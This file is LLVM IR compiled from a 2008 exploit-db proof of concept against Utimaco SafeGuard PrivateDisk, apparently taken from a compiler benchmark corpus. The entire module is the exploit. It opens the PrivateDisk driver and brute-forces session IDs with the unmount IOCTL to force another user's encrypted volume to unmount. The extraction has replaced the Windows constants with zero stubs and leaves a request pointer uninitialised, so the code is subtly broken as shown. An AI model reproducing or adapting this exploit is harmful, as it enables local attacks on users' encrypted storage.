; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_35189.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_35189.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ioctl_req = type { i8*, i32 }

@.str = private unnamed_addr constant [138 x i8] c"Utimaco Safeware AG - SafeGuard PrivateDisk unmount exploit\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2008!@$!\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [25 x i8] c"Usage: %s <volume file>\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [16 x i8] c"\\\\.\\PrivateDisk\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@FILE_SHARE_READ = common dso_local global i32 0, align 4
@FILE_SHARE_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [26 x i8] c"* CreateFileA failed, %d\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@SGPD_MAX_SESSION_ID = common dso_local global i32 0, align 4
@SGPD_UNMOUNT_IOCTL = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [41 x i8] c"* found, session_id: %d, volume name: %s\00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"* trying session_id: %d\0D\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"\0A* done\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.ioctl_req, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [256 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([138 x i8], [138 x i8]* @.str, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp sle i32 %14, 1
  br i1 %15, label %16, label %24

16:                                               ; preds = %2
  %17 = load i32, i32* @stderr, align 4
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0), i8* %20)
  %22 = load i32, i32* @EXIT_SUCCESS, align 4
  %23 = call i32 @exit(i32 %22) #3
  unreachable

24:                                               ; preds = %2
  %25 = load i32, i32* @GENERIC_READ, align 4
  %26 = load i32, i32* @FILE_SHARE_READ, align 4
  %27 = load i32, i32* @FILE_SHARE_WRITE, align 4
  %28 = or i32 %26, %27
  %29 = load i32, i32* @OPEN_EXISTING, align 4
  %30 = call i32 @CreateFileA(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i32 %25, i32 %28, i32* null, i32 %29, i32 0, i32* null)
  store i32 %30, i32* %11, align 4
  %31 = load i32, i32* %11, align 4
  %32 = load i32, i32* @INVALID_HANDLE_VALUE, align 4
  %33 = icmp eq i32 %31, %32
  br i1 %33, label %34, label %40

34:                                               ; preds = %24
  %35 = load i32, i32* @stderr, align 4
  %36 = load i32, i32* %11, align 4
  %37 = call i32 (i32, i8*, ...) @fprintf(i32 %35, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0), i32 %36)
  %38 = load i32, i32* @EXIT_FAILURE, align 4
  %39 = call i32 @exit(i32 %38) #3
  unreachable

40:                                               ; preds = %24
  %41 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %42 = call i32 @memset(i8* %41, i32 0, i32 256)
  %43 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strncpy(i8* %43, i8* %46, i32 255)
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %48

48:                                               ; preds = %68, %40
  %49 = load i32, i32* %7, align 4
  %50 = sext i32 %49 to i64
  %51 = icmp ult i64 %50, 4
  br i1 %51, label %52, label %73

52:                                               ; preds = %48
  %53 = load i32, i32* %8, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = getelementptr inbounds %struct.ioctl_req, %struct.ioctl_req* %6, i32 0, i32 0
  %58 = load i8*, i8** %57, align 8
  %59 = load i32, i32* %7, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  store i8 %56, i8* %61, align 1
  %62 = getelementptr inbounds %struct.ioctl_req, %struct.ioctl_req* %6, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %7, align 4
  %65 = add nsw i32 %64, 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %63, i64 %66
  store i8 0, i8* %67, align 1
  br label %68

68:                                               ; preds = %52
  %69 = load i32, i32* %7, align 4
  %70 = add nsw i32 %69, 2
  store i32 %70, i32* %7, align 4
  %71 = load i32, i32* %8, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %8, align 4
  br label %48

73:                                               ; preds = %48
  store i32 0, i32* %7, align 4
  br label %74

74:                                               ; preds = %98, %73
  %75 = load i32, i32* %7, align 4
  %76 = load i32, i32* @SGPD_MAX_SESSION_ID, align 4
  %77 = icmp slt i32 %75, %76
  br i1 %77, label %78, label %101

78:                                               ; preds = %74
  %79 = load i32, i32* %7, align 4
  %80 = getelementptr inbounds %struct.ioctl_req, %struct.ioctl_req* %6, i32 0, i32 1
  store i32 %79, i32* %80, align 8
  %81 = load i32, i32* %11, align 4
  %82 = load i32, i32* @SGPD_UNMOUNT_IOCTL, align 4
  %83 = call i64 @DeviceIoControl(i32 %81, i32 %82, %struct.ioctl_req* %6, i32 16, %struct.ioctl_req* %6, i32 16, i32* %9, i32 0)
  store i64 %83, i64* %12, align 8
  %84 = load i64, i64* %12, align 8
  %85 = icmp ne i64 %84, 0
  br i1 %85, label %86, label %90

86:                                               ; preds = %78
  %87 = load i32, i32* %7, align 4
  %88 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i64 0, i64 0), i32 %87, i8* %88)
  br label %101

90:                                               ; preds = %78
  %91 = load i32, i32* %7, align 4
  %92 = srem i32 %91, 64
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %97, label %94

94:                                               ; preds = %90
  %95 = load i32, i32* %7, align 4
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i32 %95)
  br label %97

97:                                               ; preds = %94, %90
  br label %98

98:                                               ; preds = %97
  %99 = load i32, i32* %7, align 4
  %100 = add nsw i32 %99, 1
  store i32 %100, i32* %7, align 4
  br label %74

101:                                              ; preds = %86, %74
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %103 = load i32, i32* %11, align 4
  %104 = call i32 @CloseHandle(i32 %103)
  %105 = load i32, i32* @EXIT_SUCCESS, align 4
  ret i32 %105
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @CreateFileA(i8*, i32, i32, i32*, i32, i32, i32*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i64 @DeviceIoControl(i32, i32, %struct.ioctl_req*, i32, %struct.ioctl_req*, i32, i32*, i32) #1

declare dso_local i32 @CloseHandle(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
